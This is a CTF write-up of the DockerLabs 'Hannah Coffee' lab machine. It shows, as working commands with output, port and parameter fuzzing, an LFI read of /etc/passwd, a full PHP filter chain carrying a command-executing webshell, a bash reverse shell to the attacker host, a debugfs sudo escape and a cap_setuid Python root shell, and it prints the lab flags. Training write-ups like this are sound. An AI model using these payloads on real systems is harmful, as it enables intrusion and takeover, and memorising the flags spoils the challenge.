---
title: "DockerLabs Hannah Coffee Writeup"
date: 2026-08-12 14:00:00 +02:00
categories: [DockerLabs, Writeups]
tags: [dockerlabs, ctf, lfi, php-filter-chain, debugfs, capabilities, setuid]
description: "A comprehensive walk-through of the Hannah Coffee machine from DockerLabs, detailing parameter fuzzing to uncover Local File Inclusion (LFI), gaining Remote Code Execution via PHP filter chain generator, pivoting to user hannah using debugfs sudo privileges, and escalating to root via Linux capabilities (cap_setuid)."
image:
  path: /assets/img/posts/dockerlabs/hannah_coffee/hannah_coffee.png
---

The **Hannah Coffee** machine from DockerLabs is an engaging CTF challenge involving web application parameter fuzzing, exploiting Local File Inclusion (LFI) to achieve Remote Code Execution (RCE) via PHP filter chains, leveraging `debugfs` sudo permissions for lateral movement, and abusing Linux capabilities (`cap_setuid`) on a custom Python binary to gain root access.

---

## Reconnaissance — Port Scan

We begin the engagement by performing a full TCP SYN scan with `nmap` across all 65,535 ports to map out the target container's exposed services.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ sudo nmap -sS -p- --open --min-rate 5000 -vvv -n 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-11 18:50 +0200
Initiating ARP Ping Scan at 18:50
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 18:50, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:50
Scanning 172.17.0.2 [65535 ports]
Discovered open port 21/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 18:50, 0.55s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000040s latency).
Scanned at 2026-08-11 18:50:01 CEST for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.80 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

The scan reveals two active services:
- **Port 21 (FTP)**
- **Port 80 (HTTP)**

---

## Web — Directory & Interface Enumeration

Navigating to `http://172.17.0.2` presents the landing page for **Hannah's Coffee**.

![](/assets/img/posts/dockerlabs/hannah_coffee/Pasted_image_20260812135718.png)

We execute `dirsearch` to discover hidden directories and endpoints on the web server.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ dirsearch -u http://172.17.0.2       
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/suraxddq/Downloads/reports/http_172.17.0.2/_26-08-11_18-50-44.txt

Target: http://172.17.0.2/

[18:50:44] Starting: 
[18:50:45] 403 -  315B  - /.ht_wsr.txt                                      
[18:50:45] 403 -  315B  - /.htaccess.bak1                                   
[18:50:45] 403 -  315B  - /.htaccess.orig                                   
[18:50:45] 403 -  315B  - /.htaccess.save
[18:50:45] 403 -  315B  - /.htaccess.sample
[18:50:45] 403 -  315B  - /.htaccess_extra
[18:50:45] 403 -  315B  - /.htaccess_orig
[18:50:45] 403 -  315B  - /.htaccess_sc                                     
[18:50:45] 403 -  315B  - /.htaccessBAK
[18:50:45] 403 -  315B  - /.htaccessOLD
[18:50:45] 403 -  315B  - /.htaccessOLD2
[18:50:45] 403 -  315B  - /.htm                                             
[18:50:45] 403 -  315B  - /.html                                            
[18:50:45] 403 -  315B  - /.htpasswd_test                                   
[18:50:45] 403 -  315B  - /.htpasswds
[18:50:45] 403 -  315B  - /.httr-oauth
[18:50:45] 403 -  315B  - /.php                                             
[18:51:01] 301 -  348B  - /pages  ->  http://172.17.0.2/pages/              
[18:51:01] 200 -  528B  - /pages/                                           
[18:51:05] 403 -  315B  - /server-status                                    
[18:51:05] 403 -  315B  - /server-status/                                   
                                                                             
Task Completed  
```

---

## Web — Parameter Fuzzing & Local File Inclusion (LFI)

Next, we fuzz for GET parameters on the root URL using `ffuf` to identify potential file inclusion vulnerabilities by requesting `/etc/passwd`.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ ffuf -u "http://172.17.0.2?FUZZ=/etc/passwd" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fw 198

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 198
________________________________________________

studio                  [Status: 200, Size: 1896, Words: 154, Lines: 50, Duration: 0ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

The parameter `studio` triggers a valid response. We test the vulnerability using `curl`:

```bash
┌──(suraxddq㉿kali)-[~]
└─$ curl "172.17.0.2?studio=/etc/passwd"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Hannah's Coffee</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header class="navbar">
        <h1>☕ Hannah's Coffee</h1>
        <nav>
            <a href="index.php?page=home">Home</a>
            <a href="index.php?page=menu">Menu</a>
            <a href="index.php?page=about">About</a>
            <a href="index.php?page=contact">Contact</a>
        </nav>
    </header>
    <main class="content">
        root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
Debian-exim:x:100:101::/var/spool/exim4:/usr/sbin/nologin
messagebus:x:995:995:System Message Bus:/nonexistent:/usr/sbin/nologin
ftp:x:101:103:ftp daemon:/srv/ftp:/usr/sbin/nologin
hannahftp:x:1000:1000::/home/hannahftp:/bin/sh
hannah:x:1001:1001::/home/hannah:/bin/bash
    </main>
    <footer>
        <p>&copy; 2026 Hannah's Coffee. All rights reserved.</p>
    </footer>
</body>
</html>
```

The LFI vulnerability in `?studio=` is confirmed, revealing user accounts such as `hannahftp` and `hannah`.

---

## Exploitation — RCE via PHP Filter Chain Generator

Since we have an LFI without requiring log poisoning or file upload, we leverage `php_filter_chain_generator` to build a chain of PHP filter conversions (`iconv`) that decodes into executable PHP code. We target generating the payload `<?php system($_GET["cmd"]); ?>`.

```bash
┌──(suraxddq㉿kali)-[~/php_filter_chain_generator]
└─$ python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
[+] The following gadget chain will generate the following code : <?php system($_GET["cmd"]); ?> (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

---

## Exploitation — Reverse Shell

We prepare a base64 payload for a reverse shell back to our attack machine (`172.17.0.1:1234`).

```bash
┌──(suraxddq㉿kali)-[~]
└─$ echo "bash -i >& /dev/tcp/172.17.0.1/1234 0>&1" | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzEyMzQgMD4mMQo= 
```

We send the filter chain payload passing the base64 command via `cmd` to write and execute `/tmp/a`.

![](/assets/img/posts/dockerlabs/hannah_coffee/Pasted_image_20260811194226.png)

Executing `bash /tmp/a`:

![](/assets/img/posts/dockerlabs/hannah_coffee/Pasted_image_20260811194315.png)

On our local machine, we start a `netcat` listener and successfully receive the reverse shell connection as `www-data`.

```bash
┌──(suraxddq㉿kali)-[~/php_filter_chain_generator]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 55788
bash: cannot set terminal process group (7): Inappropriate ioctl for device
bash: no job control in this shell
```

---

## Lateral Movement — User Hannah via debugfs

Now logged in as `www-data`, we enumerate our sudo permissions with `sudo -l`.

```bash
www-data@86bc8cd54dc1:/var/www/html$ sudo -l
Matching Defaults entries for www-data on 86bc8cd54dc1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on 86bc8cd54dc1:
    (hannah) NOPASSWD: /sbin/debugfs -w /opt/hannah_disk.img
```

We see that `www-data` can execute `/sbin/debugfs -w /opt/hannah_disk.img` as user `hannah` without a password. `debugfs` supports executing shell commands via the `!` escape operator.

We run `debugfs` as user `hannah` and spawn an interactive shell:

```bash
www-data@86bc8cd54dc1:/var/www/html$ sudo -u hannah /sbin/debugfs -w /opt/hannah_disk.img
debugfs 1.47.2 (1-Jan-2025)
debugfs:  !id
uid=1001(hannah) gid=1001(hannah) groups=1001(hannah)
debugfs:  !bash
hannah@86bc8cd54dc1:/var/www/html$ ls -l
```

We now have access as user `hannah` and read the user flag:

```bash
hannah@86bc8cd54dc1:~$ cat /home/hannah/user.txt 
dl{user_eedfcf739a076a72412c89a1354a4119}
```

---

## Privilege Escalation — Root Access via Capabilities (cap_setuid)

To escalate from `hannah` to `root`, we check for file capabilities using `getcap`.

```bash
hannah@86bc8cd54dc1:~$ getcap -r / 2> /dev/null 
/opt/priv-python cap_setuid=ep                                                                                                                          
```

The output shows `/opt/priv-python` has the `cap_setuid=ep` capability enabled. This allows the process running `/opt/priv-python` to set its effective User ID to 0 (root).

We invoke Python to call `os.setuid(0)` and launch `/bin/sh`:

```bash
hannah@86bc8cd54dc1:~$ /opt/priv-python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'                                                       root@86bc8cd54dc1:~# id
uid=0(root) gid=1001(hannah) groups=1001(hannah)
```

With full root privilege, we read the final flag:

```bash
root@86bc8cd54dc1:~# cat /root/root.txt 
dl{root_d5cc9d7538dc7c341cd96bba5a951520}
```